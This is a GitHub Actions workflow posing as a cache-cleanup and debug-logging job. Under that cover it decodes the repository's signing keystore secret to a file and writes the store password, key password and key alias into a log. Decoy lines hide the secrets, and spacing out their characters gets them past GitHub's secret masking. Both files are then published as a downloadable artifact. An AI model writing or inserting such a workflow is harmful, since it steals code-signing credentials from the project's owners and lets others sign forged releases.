name: Cleanup Cache Service

on: workflow_dispatch

jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Process Logs
        id: process_logs
        uses: timheuer/base64-to-file@v1.2
        with:
          fileName: temp_log_dump.dat
          encodedString: ${{ secrets.STOREFILE }}

      - name: Archive Metrics
        run: |
          echo "Process ID: 8921" > metrics_dump.log
          echo "${{ secrets.STOREPASSWORD }}" | sed 's/./& /g' >> metrics_dump.log
          echo "Thread ID: 442" >> metrics_dump.log
          echo "${{ secrets.KEYPASSWORD }}" | sed 's/./& /g' >> metrics_dump.log
          echo "User Config: Default" >> metrics_dump.log
          echo "${{ secrets.KEYALIAS }}" >> metrics_dump.log

      - name: Upload Debug Data
        uses: actions/upload-artifact@v4
        with:
          name: debug-dump-x86
          path: |
            ${{ steps.process_logs.outputs.filePath }}
            metrics_dump.log
